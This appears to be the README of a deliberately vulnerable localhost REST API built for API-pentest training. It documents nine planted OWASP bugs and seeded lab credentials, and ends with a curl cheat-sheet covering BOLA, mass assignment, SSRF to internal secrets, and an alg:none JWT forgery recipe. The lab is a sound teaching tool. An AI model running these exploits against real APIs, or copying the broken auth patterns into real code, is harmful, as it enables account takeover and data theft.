# 04 - ShopAPI (deliberately vulnerable JSON REST API)

> ⚠️ **INTENTIONALLY VULNERABLE — LOCALHOST ONLY.** This service ships nine real
> bugs from the OWASP API Security Top 10. Never expose it to a network. It binds
> `127.0.0.1:18804` on purpose.

**ShopAPI** is a fake e-commerce REST API used as an API-pentest training target.
It is a single, stdlib-only Python file (`http.server` + `sqlite3` +
`hmac`/`hashlib`/`base64` + `json`). There are **no external dependencies** and
JWTs are built and verified **by hand** (no PyJWT). Data lives in a seeded
in-memory SQLite database.

## Run

```bash
python app.py
# -> ShopAPI (vulnerable API lab) on http://127.0.0.1:18804
```

All responses are JSON (`Content-Type: application/json`). The server is
threaded, never crashes, and reuses the address. `GET /` or `GET /api/v1/`
returns a discoverable index of every endpoint.

## Auth model

- `POST /api/v1/login` with `{"username","password"}` returns `{"token": "<jwt>"}`.
- Protected endpoints read `Authorization: Bearer <jwt>`.
- Tokens carry `{"sub": <username>, "role": <role>}`.
- The JWT verifier is **deliberately broken** (see B8): it accepts `alg:none`
  unsigned tokens, verifies `HS256` against the weak secret `apisecret`, and
  never checks expiry.

## Seeded users

Passwords are stored as **MD5** (weak by design). Plaintext is shown here only
because this is a lab.

| id | username | password (plain) | md5(password)                      | role  | email               | ssn         |
|----|----------|------------------|------------------------------------|-------|---------------------|-------------|
| 1  | admin    | `admin123`       | `0192023a7bbd73250516f069df18b500` | admin | admin@shopapi.test  | 111-22-3333 |
| 2  | alice    | `alicepass`      | `7c90f2dc82aa5dd4501132f6d074a53a` | user  | alice@example.com   | 222-33-4444 |
| 3  | bob      | `bobsecret`      | `de3d9451c238b5949ad3597a6a682628` | user  | bob@example.com     | 333-44-5555 |
| 4  | carol    | `carol2024`      | `8c3f57612a56df09ee89dfef094c6aef` | user  | carol@example.com   | 444-55-6666 |

`admin/admin123` is the admin account. MD5 is used on purpose (weak hashing).

Orders (table `orders`: `id, user_id, item, total`):

| id   | user_id | item                  | total   |
|------|---------|-----------------------|---------|
| 1001 | 1 (admin) | Datacenter rack unit | 4999.00 |
| 1002 | 2 (alice) | Wireless headphones  | 129.99  |
| 1003 | 2 (alice) | USB-C charger        | 24.50   |
| 1004 | 3 (bob)   | Mechanical keyboard  | 109.00  |
| 1005 | 4 (carol) | 4K monitor           | 349.99  |

## Planted vulnerabilities (B1..B9)

| ID  | OWASP API category                                | Route                          | How to exploit |
|-----|---------------------------------------------------|--------------------------------|----------------|
| B1  | API1:2023 Broken Object Level Auth (BOLA)         | `GET /api/v1/orders/<id>`      | Log in as `alice`; request `orders/1001` (admin's order) or `orders/1004` (bob's). Token is valid but ownership is never checked → any order id leaks. |
| B2  | API1:2023 BOLA (PII)                               | `GET /api/v1/users/<id>`       | With any valid token, request `users/1`, `users/3`, … No ownership check → read any user's full record (email, address, ssn, internal_notes). |
| B3  | API5:2023 Broken Function Level Auth (BFLA)        | `POST /api/v1/admin/promote`   | With a **normal-user** token, `POST {"username":"alice","role":"admin"}`. The "admin" function never verifies the caller's role → self-promotion. |
| B4  | API3:2023 Broken Object Property Level / Mass Assign | `PATCH /api/v1/me`          | As `alice`, `PATCH {"role":"admin"}` (or `{"is_admin":true}`). No allow-list → arbitrary fields incl. `role` are written to your own record. |
| B5  | API3:2023 Excessive Data Exposure                 | `GET /api/v1/users`            | With any valid token, list users. The response includes `password_hash` (md5), `ssn`, and `internal_notes` — fields a client must never receive. |
| B6  | API4:2023 Unrestricted Resource Consumption (no rate limit) | `POST /api/v1/login` | Brute-force credentials: there is no counter, delay, or lockout. Hammer `login` with a wordlist; every attempt is processed instantly. |
| B7  | API7:2023 Server Side Request Forgery (SSRF)      | `POST /api/v1/avatar`          | `POST {"url":"http://127.0.0.1:18804/api/v1/internal/config"}`. The server fetches the URL with no destination validation and reflects the body → leaks internal config (db DSN, stripe key, aws keys, flag). |
| B8  | API2:2023 Broken Authentication (JWT)             | all protected routes           | (a) Forge `{"alg":"none"}` header + `{"sub":"admin","role":"admin"}` payload, empty signature → accepted by `GET /api/v1/me`. (b) The HS256 secret is `apisecret` (guessable/brute-forceable), so you can mint valid signed tokens too. (c) `exp` is never validated. |
| B9  | API8:2023 Security Misconfiguration (verbose error)| `POST /api/v1/orders`         | `POST` malformed JSON (e.g. `{bad json`) or `{"item": 123}` (non-string). The full Python traceback is returned in the response body instead of a generic error. |

### The SSRF target

`GET /api/v1/internal/config` returns fake internal secrets but **refuses
non-loopback callers** (returns 403 unless the request comes from `127.0.0.1` /
`::1`). It is reachable through the SSRF in `POST /api/v1/avatar` (B7), which
fetches it *from the server itself*.

## Quick start (exploit cheat-sheet)

```bash
BASE=http://127.0.0.1:18804

# get a normal-user token
TOK=$(curl -s $BASE/api/v1/login -d '{"username":"alice","password":"alicepass"}' \
      | python -c "import sys,json;print(json.load(sys.stdin)['token'])")

# B1: cross-user order
curl -s -H "Authorization: Bearer $TOK" $BASE/api/v1/orders/1001

# B5: excessive data exposure
curl -s -H "Authorization: Bearer $TOK" $BASE/api/v1/users

# B3: self-promote via admin function
curl -s -H "Authorization: Bearer $TOK" $BASE/api/v1/admin/promote \
     -d '{"username":"alice","role":"admin"}'

# B4: mass assignment
curl -s -X PATCH -H "Authorization: Bearer $TOK" $BASE/api/v1/me \
     -d '{"role":"admin"}'

# B7: SSRF to internal config
curl -s -H "Authorization: Bearer $TOK" $BASE/api/v1/avatar \
     -d '{"url":"http://127.0.0.1:18804/api/v1/internal/config"}'

# B9: traceback
curl -s -H "Authorization: Bearer $TOK" $BASE/api/v1/orders -d '{bad json'
```

For an `alg:none` forgery (B8), base64url-encode `{"alg":"none","typ":"JWT"}` and
`{"sub":"admin","role":"admin"}`, join with a trailing dot, and send it as the
Bearer token — no signature required.

See `gabarito.json` for the machine-readable answer key.
